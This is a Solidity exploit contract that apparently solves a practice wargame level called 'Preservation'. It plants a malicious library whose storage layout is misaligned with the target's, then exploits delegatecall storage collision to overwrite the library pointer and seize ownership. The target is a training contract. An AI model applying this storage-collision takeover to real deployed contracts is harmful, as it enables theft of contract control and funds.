// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../preservation/Preservation.sol";

contract PreservationHack {
    Preservation preservation;

    constructor(address instance) {
        preservation = Preservation(instance);
        LibraryContractHack libHack = new LibraryContractHack();
        preservation.setFirstTime(uint256(uint160(address(libHack))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }
}

// Simple library contract to set the time
contract LibraryContractHack {
    // stores a timestamp
    uint256 dummya;
    uint256 dummyb;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
